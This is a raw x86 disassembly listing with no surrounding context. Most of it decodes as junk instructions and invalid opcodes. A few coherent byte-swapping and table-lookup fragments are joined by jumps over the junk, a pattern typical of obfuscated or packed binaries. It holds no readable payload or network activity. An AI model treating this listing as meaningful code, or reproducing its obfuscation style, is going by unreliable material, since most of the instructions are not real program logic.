  412c3f:	jno    0x412c2e
  412c41:	and    al,0x1d
  412c43:	ja     0x412be4
  412c45:	pop    ds
  412c46:	and    edi,esi
  412c48:	push   0xffffffaf
  412c4a:	cmp    dh,ch
  412c4c:	jmp    0xcdc6622a
  412c51:	push   edi
  412c52:	imul   ecx,DWORD PTR [ebp+0x3288d335],0x6e
  412c59:	fild   DWORD PTR [ebx+ebx*4-0x56fdae4a]
  412c60:	inc    ecx
  412c61:	xchg   ebp,ebp
  412c63:	mov    WORD PTR [ebp+0x2f],?
  412c66:	pop    esi
  412c67:	mov    edi,DWORD PTR [ebp-0x1c]
  412c6a:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412c71:	jmp    0x412ef9
  412c76:	int    0xcc
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   edi,eax
  412c83:	pop    ecx
  412c84:	or     eax,0x7877fcfd
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c3d
  412c8f:	pop    eax
  412c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c91:	jbe    0x412ceb
  412c93:	xchg   ecx,eax
  412c94:	sbb    BYTE PTR ds:0xe81b3cf7,dh
  412c9a:	dec    ebp
  412c9b:	push   ebp
  412c9c:	xlat   BYTE PTR ds:[ebx]
  412c9d:	faddp  st(6),st
  412c9f:	ins    BYTE PTR es:[edi],dx
  412ca0:	add    edx,ebp
  412ca2:	and    esp,ecx
  412ca4:	lahf   
  412ca5:	(bad)  
  412ca8:	push   ss
  412ca9:	cmp    al,0x67
  412cab:	test   al,0x4b
  412cad:	(bad)  
  412cae:	fcomp  QWORD PTR [ebx+0x4cd3a461]
  412cb4:	aaa    
  412cb5:	lahf   
  412cb6:	pop    ss
  412cb7:	or     DWORD PTR [edi-0x38],ebx
  412cba:	and    DWORD PTR [ebx-0x18a3d880],esp
  412cc0:	xchg   esi,eax
  412cc1:	je     0x412c49
  412cc3:	outs   dx,BYTE PTR ds:[esi]
  412cc4:	and    bh,ch
  412cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc7:	aad    0xdd
  412cc9:	pop    ds
  412cca:	scas   al,BYTE PTR es:[edi]
  412ccb:	mov    ss,WORD PTR [ebp+ecx*2-0x2b28c5af]
  412cd2:	pop    es
  412cd3:	and    eax,0xbb2e314d
  412cd8:	or     esi,DWORD PTR [edi+0x56]
  412cdb:	inc    esi
  412cdc:	fwait
  412cdd:	dec    esi
  412cde:	cmp    BYTE PTR [ebp+0x37],0xbb
  412ce2:	jge    0x412c7e
  412ce4:	mov    DWORD PTR [ebx-0x68],eax
  412ce7:	push   edx
  412ce8:	test   BYTE PTR [ebx],bh
  412cea:	in     al,0x8
  412cec:	sti    
  412ced:	div    DWORD PTR [edx-0x79]
  412cf0:	adc    dh,BYTE PTR [eax]
  412cf2:	jb     0x412d67
  412cf4:	xor    cl,BYTE PTR [ebx]
  412cf6:	test   eax,0x3a19cbb1
  412cfb:	xor    esp,DWORD PTR [ecx-0x5b]
  412cfe:	dec    ebx
  412cff:	movd   DWORD PTR [edi+0x27d9c3c],mm0
  412d06:	push   DWORD PTR [esp+edi*2]
  412d09:	ins    DWORD PTR es:[edi],dx
  412d0a:	add    eax,DWORD PTR [edi+0x2]
  412d0d:	mov    edi,0xcf7856e2
  412d12:	xchg   ebx,eax
  412d13:	es call 0x8ab2:0xeb11071f
  412d1b:	sub    al,al
  412d1d:	dec    DWORD PTR [ebx+ecx*4-0x4a]
  412d21:	push   esp
  412d22:	mov    edx,0x5002f546
  412d27:	mov    ah,0xe
  412d29:	repz stc 
  412d2b:	rol    DWORD PTR [eax+0x37063b02],cl
  412d31:	pop    ss
  412d32:	jle    0x412d60
  412d34:	push   cs
  412d35:	push   cs
  412d36:	outs   dx,BYTE PTR ds:[esi]
  412d37:	sti    
  412d38:	repnz les ecx,FWORD PTR [edi+0x32f97d07]
  412d3f:	int    0xee
  412d41:	ins    DWORD PTR es:[edi],dx
  412d42:	adc    DWORD PTR [ebx+0x644e6775],edi
  412d48:	jp     0x412d8e
  412d4a:	test   BYTE PTR [eax-0x24],cl
  412d4d:	repnz es (bad) 
  412d50:	cmp    BYTE PTR [ecx-0x665259f9],ah
  412d56:	inc    ebx
  412d57:	cmp    eax,0x9a5a46cd
  412d5c:	ins    BYTE PTR es:[edi],dx
  412d5d:	jg     0x412cfd
  412d5f:	enter  0x3fb1,0xc1
  412d63:	popa   
  412d64:	leave  
  412d65:	xchg   DWORD PTR [ecx+eax*4+0x69],edi
  412d69:	adc    BYTE PTR [ecx+0x3cb1f909],bh
  412d6f:	jecxz  0x412d4e
  412d71:	cld    
  412d72:	mov    DWORD PTR [eax-0x7f545767],eax
  412d78:	adc    esp,DWORD PTR [edi-0x31]
  412d7b:	stos   BYTE PTR es:[edi],al
  412d7c:	add    DWORD PTR [ecx-0x37bbfc96],ecx
  412d82:	(bad)  
  412d84:	cs add eax,ecx
  412d87:	and    al,0x98
  412d89:	sbb    DWORD PTR [edx-0x10],ebp
  412d8c:	fnstsw WORD PTR [eax*2-0x11b70984]
  412d93:	aaa    
  412d94:	fidivr WORD PTR [ecx+ebp*8+0x70]
  412d98:	js     0x412d77
  412d9a:	jb     0x412d33
  412d9c:	repz push ss
  412d9e:	sbb    eax,0x5bc2d0c9
  412da3:	xchg   ebx,eax
  412da4:	dec    ecx
  412da5:	out    0xab,eax
  412da7:	jno    0x412d71
  412da9:	pop    edi
  412daa:	push   ss
  412dab:	mov    eax,0x53fd8f6c
  412db0:	jle    0x412def
  412db2:	dec    esi
  412db3:	add    eax,DWORD PTR ds:0xf819b2b9
  412db9:	and    DWORD PTR [ebp+0x35],ebx
  412dbc:	mov    esi,0xf7552dcf
  412dc1:	inc    edx
  412dc2:	sbb    DWORD PTR [esi+0x1],0x97b478ba
  412dc9:	xlat   BYTE PTR ds:[ebx]
  412dca:	sbb    eax,0x1ecf50f4
  412dcf:	lods   al,BYTE PTR ds:[esi]
  412dd0:	dec    eax
  412dd1:	mov    al,ds:0xed4898ba
  412dd6:	test   ch,bh
  412dd8:	stc    
  412dd9:	push   cs
  412dda:	cmp    DWORD PTR [ecx],edx
  412ddc:	das    
  412ddd:	cmp    eax,0x653920f3
  412de2:	push   ss
  412de3:	mov    ebp,0x54126bb5
  412de8:	adc    al,0x6d
  412dea:	xor    eax,0x78093bb2
  412def:	mov    ?,edi
  412df1:	lahf   
  412df2:	xlat   BYTE PTR ds:[ebx]
  412df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412df4:	dec    edi
  412df5:	mov    ebp,0xc1410802
  412dfa:	call   0x23788214
  412dff:	pushf  
  412e00:	push   esi
  412e01:	fldenv [esi-0x61f58156]
  412e07:	sub    al,0x9e
  412e09:	mov    esi,DWORD PTR [ebp-0x35]
  412e0c:	frstor [edx+0x44]
  412e0f:	inc    BYTE PTR [edi-0x1c9d4d4d]
  412e15:	nop
  412e16:	outs   dx,BYTE PTR ds:[esi]
  412e17:	in     al,0xf5
  412e19:	jle    0x412e88
  412e1b:	mov    bl,0x99
  412e1d:	mov    esp,0x6536e9f9
  412e22:	mov    esp,0xaac8f6ab
  412e27:	mov    cl,0x8d
  412e29:	into   
  412e2a:	out    0xa2,al
  412e2c:	ins    BYTE PTR es:[edi],dx
  412e2d:	and    al,0x3e
  412e2f:	cmp    eax,0x73ab88e9
  412e34:	or     dl,BYTE PTR [esi]
  412e36:	pop    eax
  412e37:	pop    ebx
  412e38:	xchg   esi,eax
  412e39:	add    bh,BYTE PTR [ebp-0x28]
  412e3c:	nop
  412e3d:	mov    bl,0x5e
  412e3f:	cli    
  412e40:	xor    BYTE PTR [edi+0x3a8ece11],ah
  412e46:	pusha  
  412e47:	loopne 0x412e51
  412e49:	dec    esi
  412e4a:	(bad)  
  412e4b:	ds mov ds,ebx
  412e4e:	pop    ebx
  412e4f:	stos   BYTE PTR es:[edi],al
  412e50:	pusha  
  412e51:	pop    es
  412e52:	xor    ah,BYTE PTR [ecx]
  412e54:	aas    
  412e55:	out    0x7c,eax
  412e57:	xor    ecx,0xffffffd1
  412e5a:	xchg   ecx,eax
  412e5b:	shr    DWORD PTR [ebx-0x4d],cl
  412e5e:	repz inc esi
  412e60:	retf   
  412e61:	sub    eax,0xdcf740e0
  412e66:	push   ds
  412e67:	xor    BYTE PTR [ecx+0x54],bl
  412e6a:	ja     0x412eb5
  412e6c:	mov    al,0x92
  412e6e:	sbb    bl,BYTE PTR [esi]
  412e70:	push   esp
  412e71:	inc    esp
  412e72:	retf   
  412e73:	les    ebx,FWORD PTR [ebp-0x7e]
  412e76:	mov    edx,0xfffa27fd
  412e7b:	or     dh,BYTE PTR [esi]
  412e7d:	addr16 jnp 0x412e8e
  412e80:	in     eax,0x16
  412e82:	jne    0x412e0a
  412e84:	rcl    BYTE PTR [eax+0x761b6e31],cl
  412e8a:	inc    esp
  412e8b:	sub    eax,0x8be2917a
  412e90:	sub    dh,BYTE PTR [ebx]
  412e92:	adc    DWORD PTR [esi],ebx
  412e94:	pop    ebx
  412e95:	sbb    eax,0x140a746
  412e9a:	rcr    BYTE PTR [edx],0x15
  412e9d:	and    al,0x51
  412e9f:	leave  
  412ea0:	test   bl,dl
  412ea2:	fwait
  412ea3:	xor    DWORD PTR [edi],ecx
  412ea5:	dec    eax
  412ea6:	mov    ebp,0xb915cfee
  412eab:	cmp    DWORD PTR [ebp-0x2256804b],esp
  412eb1:	add    DWORD PTR [edx-0x68],ebx
  412eb4:	push   cs
  412eb5:	das    
  412eb6:	mov    dl,BYTE PTR [esi+0x7c8c2c4c]
  412ebc:	lds    edx,FWORD PTR [edi]
  412ebe:	adc    esi,ebx
  412ec0:	and    dl,BYTE PTR [edi+0x5b]
  412ec3:	call   0x32d7:0x4bdbae4
  412eca:	fadd   st(7),st
  412ecc:	xchg   ecx,eax
  412ecd:	mov    dh,0x73
  412ecf:	inc    edi
  412ed0:	sbb    ebx,DWORD PTR [esi]
  412ed2:	mov    ebx,0xa8727759
  412ed7:	dec    edi
  412ed8:	mov    cl,0x90
  412eda:	mov    eax,ds:0xc39684b0
  412edf:	add    eax,0xf5c27f09
  412ee4:	push   cs
  412ee5:	dec    eax
  412ee6:	div    BYTE PTR [edi+0x2b29ff9b]
  412eec:	dec    edx
  412eed:	outs   dx,DWORD PTR ds:[esi]
  412eee:	sub    ch,BYTE PTR [ecx+0x6]
  412ef1:	pusha  
  412ef2:	or     dh,ah
  412ef4:	jbe    0x412eb0
  412ef6:	out    dx,eax
  412ef7:	jge    0x412f47
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x52
  412f26:	add    DWORD PTR [ebx-0x14],ebp
  412f29:	imul   esi,DWORD PTR [ebp+0x78],0x787ee578
  412f30:	js     0x412f57
  412f32:	fwait
  412f33:	push   ebx
  412f34:	add    eax,0x384fba46
  412f39:	sub    al,0xad
  412f3b:	fsubr  QWORD PTR [ebx]
  412f3d:	pop    ebx
  412f3e:	mov    BYTE PTR [edx-0x40],ch
  412f41:	scas   al,BYTE PTR es:[edi]
  412f42:	xchg   BYTE PTR [esi+0x37],cl
  412f45:	out    dx,eax
  412f46:	not    dl
  412f48:	and    al,0xc1
  412f4a:	jecxz  0x412eda
  412f4c:	push   0x23
  412f4e:	add    al,0xc5
  412f50:	lahf   
  412f51:	and    ecx,esp
  412f53:	xchg   esi,eax
  412f54:	and    dh,BYTE PTR [esi-0xd8488f1]
  412f5a:	mov    bh,0x17
  412f5c:	mov    eax,0x3b238ce3
  412f61:	dec    DWORD PTR [ecx+0x4e]
  412f64:	sub    BYTE PTR [ecx+0x7151228c],dl
  412f6a:	or     eax,DWORD PTR [edi]
  412f6c:	retf   0xb2a6
  412f6f:	mov    cl,BYTE PTR [edi]
  412f71:	aas    
  412f72:	and    ah,ah
  412f74:	adc    bl,ch
  412f76:	out    dx,eax
  412f77:	or     BYTE PTR [ebx+0x5821749e],bl
  412f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f7e:	dec    eax
  412f7f:	nop
  412f80:	stos   DWORD PTR es:[edi],eax
  412f81:	push   ebx
  412f82:	jmp    0x412faf
  412f84:	js     0x412f0a
  412f86:	add    al,0xc
  412f88:	xchg   ecx,eax
  412f89:	iret   
  412f8a:	push   esp
  412f8b:	pop    es
  412f8c:	xor    eax,DWORD PTR [esi-0x12]
  412f8f:	pop    esp
  412f90:	jecxz  0x412f27
  412f92:	jmp    0x3d2a:0xb542062e
  412f99:	sbb    eax,ebx
  412f9b:	mov    esi,0xfb7171ed
  412fa0:	xor    BYTE PTR [edi],ch
  412fa2:	retf   
  412fa3:	sti    
  412fa4:	mov    al,ds:0x52ed79a
  412fa9:	xor    edi,0xffffff90
  412fac:	cmp    edi,DWORD PTR [eax+0xc]
  412faf:	or     DWORD PTR [eax],0x4
  412fb2:	hlt    
  412fb3:	ret    0xf097
  412fb6:	jbe    0x413005
  412fb8:	call   0xd33437a3
  412fbd:	mov    edi,0x5f0fadd7
  412fc2:	mov    ds:0x949e2f11,eax
  412fc7:	daa    
  412fc8:	and    DWORD PTR [ebx],esp
  412fca:	int    0x3e
  412fcc:	into   
  412fcd:	in     eax,0x2e
  412fcf:	sub    dl,dh
  412fd1:	adc    dh,dl
  412fd3:	jl     0x412fe2
  412fd5:	leave  
  412fd6:	call   0xfdbe96a5
  412fdb:	sbb    al,0x7c
  412fdd:	sbb    esp,DWORD PTR [edx]
  412fdf:	repz mov ?,WORD PTR [ecx+ebx*4]
  412fe3:	ss push ebp
  412fe5:	aam    0xac
  412fe7:	pusha  
  412fe8:	mov    edx,0xa5d30be1
  412fed:	sbb    BYTE PTR [esi+0x7ea516ca],al
  412ff3:	fwait
  412ff4:	mov    ds:0x644e0a3d,al
  412ff9:	sar    DWORD PTR [ebx],1
  412ffb:	mov    ds:0xc14068ca,al
  413000:	inc    esi
  413001:	rcr    DWORD PTR ds:0x4209fe53,1
  413007:	and    BYTE PTR [edx],0x6a
  41300a:	rcr    BYTE PTR [esi-0x23670d1b],1
  413010:	push   ds
  413011:	out    0xed,al
  413013:	jge    0x41305e
  413015:	push   edi
  413016:	mov    ecx,0x83d86644
  41301b:	mov    edi,0xbb039bc3
  413020:	mov    esi,0x2d3f45d5
  413025:	(bad)  
  413026:	hlt    
  413027:	inc    edi
  413028:	imul   esp,DWORD PTR [edi+ebp*1+0x17],0x46
  41302d:	mov    dl,BYTE PTR [ebp+0x36]
  413030:	sti    
  413031:	std    
  413032:	push   0xe53a94d6
  413037:	gs dec eax
  413039:	xchg   BYTE PTR [ecx],bl
  41303b:	adc    esi,ecx
  41303d:	rcr    BYTE PTR [eax-0x69fbd06b],1
  413043:	loop   0x41301a
  413045:	retf   0xa705
  413048:	adc    ch,BYTE PTR [ebx+0x63]
  41304b:	out    0xa7,eax
  41304d:	xlat   BYTE PTR ds:[ebx]
  41304e:	sub    BYTE PTR [ebx+0x256fc2a0],0x9a
  413055:	push   cs
  413056:	in     al,0x7c
  413058:	jmp    ecx
  41305a:	sahf   
  41305b:	xor    edx,DWORD PTR [ecx+0x12f61ac]
  413061:	(bad)
  413064:	jns    0x413042
  413066:	pop    es
  413067:	inc    ebp
  413068:	sub    bh,BYTE PTR [eax+edi*2]
  41306b:	lock scas al,BYTE PTR es:[edi]
  41306d:	sahf   
  41306e:	xchg   esp,eax
  41306f:	adc    al,0xcd
  413071:	mov    dh,0x8b
  413073:	stos   DWORD PTR es:[edi],eax
  413074:	std    
  413075:	cmp    BYTE PTR [ebx],ch
  413077:	leave  
  413078:	loopne 0x4130ba
  41307a:	aas    
  41307b:	pop    ss
  41307c:	and    BYTE PTR ds:[esi],dl
  41307f:	xchg   BYTE PTR [esp+esi*1+0x6b2d97e3],bh
  413086:	inc    eax
  413087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413088:	jno    0x4130af
  41308a:	xchg   esp,eax
  41308b:	call   0xa6a5:0xc2f5d39
  413092:	sub    DWORD PTR [eax+eiz*8+0x6f7ee292],edx
  413099:	inc    edx
  41309a:	test   eax,0x3256a48e
  41309f:	and    eax,0xa7f07f31
  4130a4:	daa    
  4130a5:	inc    esp
  4130a6:	xlat   BYTE PTR ds:[ebx]
  4130a7:	mov    WORD PTR [edi+0x4e],ss
  4130aa:	leave  
  4130ab:	and    edi,DWORD PTR [edx+ecx*1]
  4130ae:	xchg   edi,eax
  4130af:	jb     0x4130b6
  4130b1:	cmp    al,0xe6
  4130b3:	xor    eax,edi
  4130b5:	dec    eax
  4130b6:	mov    ebp,0x2d8a1fa7
  4130bb:	mov    eax,0x8158cc05
  4130c0:	mov    eax,ebp
  4130c2:	in     al,dx
  4130c3:	call   0xcb06016a
  4130c8:	sub    eax,DWORD PTR [ecx+edi*1-0x3aee9d3e]
  4130cf:	add    dh,al
  4130d1:	or     BYTE PTR [ecx+0x4f],al
  4130d4:	lods   al,BYTE PTR ds:[esi]
  4130d5:	or     al,0xcf
  4130d7:	inc    ebx
  4130d8:	out    0x2b,al
  4130da:	pop    edi
  4130db:	(bad)  
  4130dc:	sub    al,0x6c
  4130de:	mov    ds:0xd9a3de5d,eax
  4130e3:	test   eax,0xf68badd6
  4130e8:	push   0x65241bf4
  4130ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ee:	imul   eax,DWORD PTR [esp+eiz*8+0x4ddeb8c8],0xd0492792
  4130f9:	or     edx,ebp
  4130fb:	jecxz  0x4130e1
  4130fd:	and    bl,dh
  4130ff:	jp     0x4130aa
  413101:	push   ebx
  413102:	out    0xf7,eax
  413104:	or     DWORD PTR [ebp-0x4bdc1934],edx
  41310a:	rcr    BYTE PTR [esi],cl
  41310c:	mov    ebx,0xb2a795c5
  413111:	retf   0x43ea
  413114:	inc    edi
  413115:	or     eax,0x1b01e2a2
  41311a:	jbe    0x41313a
  41311c:	lahf   
  41311d:	jg     0x413184
  41311f:	or     DWORD PTR [ebx-0x51],0x1e
  413123:	ds xor dl,bl
  413126:	pop    ss
  413127:	add    eax,DWORD PTR [edi-0x56eb2189]
  41312d:	stos   DWORD PTR es:[edi],eax
  41312e:	push   ecx
  41312f:	out    0x7b,al
  413131:	sbb    DWORD PTR [ebx],ebx
  413133:	pop    ecx
  413134:	daa    
  413135:	pop    edx
  413136:	clc    
  413137:	int    0x53
  413139:	sbb    al,0xca
  41313b:	or     DWORD PTR ds:0xd677f56b,ebp
  413141:	cmp    DWORD PTR [eax-0x43],edx
  413144:	jno    0x4130c7
  413146:	fld    QWORD PTR [esi+ecx*1]
  413149:	push   ebp
  41314a:	mov    esp,DWORD PTR [esi-0x8b84bce]
  413150:	popf   
  413151:	mov    ebx,0x12a76cb2
  413156:	fisttp WORD PTR [edi]
  413158:	or     BYTE PTR [eax-0x576e135d],bl
  41315e:	cmp    al,0xb5
  413160:	sbb    eax,0x3d538d07
  413165:	stc    
  413166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413167:	or     BYTE PTR ds:0x18f8bc14,0xa3
  41316e:	into   
  41316f:	out    dx,eax
  413170:	push   edi
  413171:	out    0xa1,eax
  413173:	adc    eax,0xe767e0f2
  413178:	and    BYTE PTR [edi],0x90
  41317b:	sub    al,0xa6
  41317d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41317e:	jo     0x41317a
  413180:	xchg   ebp,eax
  413181:	(bad)  
  413182:	adc    al,0x52
  413184:	clc    
  413185:	lock stos DWORD PTR es:[edi],eax
  413187:	mov    edi,0xddd87f01
  41318c:	js     0x413203
  41318e:	(bad)  
  41318f:	xor    BYTE PTR [esi+0xc870321],0xf5
  413196:	outs   dx,BYTE PTR ds:[esi]
  413197:	inc    ebx
  413198:	sub    DWORD PTR [ebp+0x7d8b1694],esp
  41319e:	hlt    
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	repnz fwait
  4131c9:	or     edx,ebp
  4131cb:	(bad)  
  4131cc:	jp     0x413246
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x41315c
  4131d4:	xchg   ebp,eax
  4131d5:	pushf  
  4131d6:	add    eax,0xdcc6e53d
  4131db:	stos   DWORD PTR es:[edi],eax
  4131dc:	jp     0x413161
  4131de:	fisubr DWORD PTR [eax+eiz*1]
  4131e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e2:	les    ebx,FWORD PTR [edx+0xf188b7e]
  4131e8:	jp     0x413262
  4131ea:	pop    es
  4131eb:	pop    ss
  4131ec:	xor    ch,dl
  4131ee:	xor    al,0x7
  4131f0:	addr16 hlt 
  4131f2:	(bad)  
  4131f3:	in     al,dx
  4131f4:	gs xchg esp,eax
  4131f6:	dec    eax
  4131f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f8:	mov    BYTE PTR [esi+0x108b5c54],cl
  4131fe:	cmp    BYTE PTR [ebp-0x190f0851],cl
  413204:	mov    edx,0xbd2962b3
  413209:	ja     0x4131d3
  41320b:	je     0x4131a1
  41320d:	xchg   ebx,eax
  41320e:	(bad)  
  413210:	sbb    DWORD PTR [ecx],esi
  413212:	test   eax,0x8748b4b7
  413217:	cmp    DWORD PTR [eax+0x71f8e20c],esi
  41321d:	mov    ebx,0x407011
  413222:	xchg   esp,eax
  413223:	es inc esi
  413225:	inc    eax
  413226:	(bad)  
  413227:	add    BYTE PTR [edi+0xe89258d],dl
  41322d:	mov    cl,0xcf
  41322f:	test   eax,0x6a0ec00c
  413234:	test   al,0xec
  413236:	jb     0x413265
  413238:	jnp    0x41328c
  41323a:	push   edx
  41323b:	jle    0x413210
  41323d:	shr    DWORD PTR [edi-0x45],1
  413240:	popf   
  413241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413242:	jge    0x4131eb
  413244:	xor    al,0x63
  413246:	aas    
  413247:	aam    0xbf
  413249:	jecxz  0x41329f
  41324b:	stos   BYTE PTR es:[edi],al
  41324c:	sub    eax,DWORD PTR [ebp-0x4]
  41324f:	aad    0xf1
  413251:	jmp    0xdc6f:0xaa22aa87
  413258:	push   cs
  413259:	sbb    ebp,ebx
  41325b:	hlt    
  41325c:	fbstp  TBYTE PTR [ebp+edx*4+0x581b54e5]
  413263:	mov    bl,0xb2
  413265:	sub    BYTE PTR [ebp-0x26f57fc9],ch
  41326b:	cld    
  41326c:	jge    0x4131fe
  41326e:	shl    DWORD PTR [ecx],0x5
  413271:	inc    ebx
  413272:	pusha  
  413273:	sub    bl,BYTE PTR [eax+0x14140566]
  413279:	outs   dx,BYTE PTR ds:[esi]
  41327a:	xchg   DWORD PTR [edi+ecx*4-0x19],ecx
  41327e:	lods   eax,DWORD PTR ds:[esi]
  41327f:	lods   eax,DWORD PTR ds:[esi]
  413280:	mov    bl,ch
  413282:	jns    0x413267
  413284:	xchg   edx,eax
  413285:	les    eax,FWORD PTR [edi]
  413287:	mov    cl,ch
  413289:	pop    es
  41328a:	mov    dl,0x91
  41328c:	jno    0x413252
  41328e:	inc    esi
  41328f:	shl    DWORD PTR [esi],0x27
  413292:	mov    edx,0xecef12c3
  413297:	(bad)  
  413299:	jmp    0x43eef1e8
  41329e:	jae    0x4132f3
  4132a0:	aas    
  4132a1:	pushf  
  4132a2:	nop    DWORD PTR [edi+0x3ea00877]
  4132a9:	push   ebx
  4132aa:	pop    ebx
  4132ab:	mov    edi,0xb4e1963e
  4132b0:	clc    
  4132b1:	dec    ecx
  4132b2:	sub    esp,DWORD PTR [ecx+ecx*1+0x64]
  4132b6:	sub    DWORD PTR [esi-0x68],eax
  4132b9:	adc    eax,0x7e7daa12
  4132be:	enter  0x4034,0xf2
  4132c2:	jmp    0x41332d
  4132c4:	add    eax,0x4b171356
  4132c9:	pop    ebp
  4132ca:	mov    ch,0x7
  4132cc:	jo     0x413322
  4132ce:	sub    DWORD PTR [edx],esi
  4132d0:	pop    ebx
  4132d1:	ds ret 0x8edb
  4132d5:	fist   WORD PTR [edx-0x61]
  4132d8:	xor    edx,DWORD PTR [ecx]
  4132da:	dec    esp
  4132db:	sbb    eax,0xc33583f
  4132e0:	(bad)  
  4132e2:	dec    esi
  4132e3:	pushf  
  4132e4:	ror    cl,cl
  4132e6:	xor    eax,0xedc069f0
  4132eb:	and    eax,0xdada2c45
  4132f0:	add    eax,0xf09d420b
  4132f5:	mov    dh,0x28
  4132f7:	les    esp,FWORD PTR [esp+edx*1-0x7]
  4132fb:	lahf   
  4132fc:	xchg   ebp,eax
  4132fd:	outs   dx,BYTE PTR ds:[esi]
  4132fe:	xchg   BYTE PTR [edx+0x773b1fa1],ah
  413304:	push   0xffffffde
  413306:	push   0x3e3b3a4f
  41330b:	(bad)  
  41330c:	adc    DWORD PTR [edi+0xac42c8b],ecx
  413312:	enter  0x905e,0x6e
  413316:	jmp    0x64974060
  41331b:	xchg   esp,eax
  41331c:	sahf   
  41331d:	jb     0x41332f
  41331f:	push   ss
  413320:	mov    ah,0xb7
  413322:	pop    esp
  413323:	inc    eax
  413324:	popf   
  413325:	cld    
  413326:	and    BYTE PTR ds:0x37284bb7,0x73
  41332d:	fucomip st,st(3)
  41332f:	inc    esi
  413330:	dec    esi
  413331:	sub    al,0x87
  413333:	aam    0xf5
  413335:	xchg   ecx,eax
  413336:	cdq    
  413337:	pushw  ss
  413339:	fnstenv [eax+ebp*8+0x38]
  41333d:	fsub   st(6),st
  41333f:	std    
  413340:	sar    BYTE PTR [edx-0x45f9cf89],cl
  413346:	stos   BYTE PTR es:[edi],al
  413347:	or     BYTE PTR [edi+0x7f],0xd7
  41334b:	mov    ebp,0x407f7df2
  413350:	inc    edi
  413351:	pop    es
  413352:	add    al,0x22
  413354:	test   DWORD PTR [edi-0x1e108aed],edi
  41335a:	mov    ecx,0xb85945b6
  41335f:	inc    si
  413361:	adc    DWORD PTR [edi],0xffffffbe
  413364:	in     eax,0x1e
  413366:	push   ebx
  413367:	iret   
  413368:	fstp   QWORD PTR [eax-0x52]
  41336b:	add    DWORD PTR [edx+0xe],edi
  41336e:	loopne 0x4133db
  413370:	leave  
  413371:	mov    ds:0x716413d6,eax
  413376:	cmp    eax,0x84bad806
  41337b:	mov    DWORD PTR [ecx+edi*4-0x6a5ac68a],edx
  413382:	ss (bad) 
  413384:	test   edx,0xb7d7301e
  41338a:	or     bl,BYTE PTR ss:[ebp-0x55]
  41338e:	mov    edx,0x9a4ac469
  413393:	lds    ebx,FWORD PTR [esi]
  413395:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413397:	mov    eax,ds:0x393a6d67
  41339c:	call   0x1fbb55cf
  4133a1:	dec    BYTE PTR ds:0x409bf54
  4133a7:	dec    edi
  4133a8:	les    esp,FWORD PTR [edi]
  4133aa:	push   0x2ed0977b
  4133af:	sub    bh,BYTE PTR [esi+0x58340cfd]
  4133b5:	add    eax,0x1201f428
  4133ba:	push   edx
  4133bb:	daa    
  4133bc:	mov    ch,0x9
  4133be:	mov    dl,0x4
  4133c0:	jae    0x413395
  4133c2:	adc    eax,0x7cc7f281
  4133c7:	mov    bh,al
  4133c9:	ret    
  4133ca:	(bad)  
  4133cb:	mov    ds:0xda5fa0fd,al
  4133d0:	pop    esp
  4133d1:	mov    dh,0xe7
  4133d3:	in     eax,0x17
  4133d5:	scas   al,BYTE PTR es:[edi]
  4133d6:	imul   eax,DWORD PTR [esi],0xe19d4b2e
  4133dc:	daa    
  4133dd:	jp     0x4133b5
  4133df:	xchg   ecx,eax
  4133e0:	retf   0x8e3
  4133e3:	pop    eax
  4133e4:	das    
  4133e5:	mov    cl,BYTE PTR [ebp-0x62]
  4133e8:	mov    WORD PTR [ebx],cs
  4133ea:	add    DWORD PTR [edi-0x4],ebx
  4133ed:	push   esi
  4133ee:	fcomp  DWORD PTR [ebp-0x6d8da19]
  4133f4:	scas   eax,DWORD PTR es:[edi]
  4133f5:	clc    
  4133f6:	call   0x360f1c43
  4133fb:	out    dx,eax
  4133fc:	cmp    DWORD PTR [esi+0x2d3ae12d],edx
  413402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413403:	inc    esi
  413404:	fistp  WORD PTR [eax-0x23]
  413407:	je     0x41341d
  413409:	pop    esp
  41340a:	popa   
  41340b:	clc    
  41340c:	retf   
  41340d:	pop    eax
  41340e:	dec    ch
  413410:	inc    BYTE PTR [ecx+0x61177442]
  413416:	dec    edx
  413417:	stc    
  413418:	aam    0x8
  41341a:	or     DWORD PTR [eax],esp
  41341c:	sub    DWORD PTR [ecx-0x27],0xffffffa6
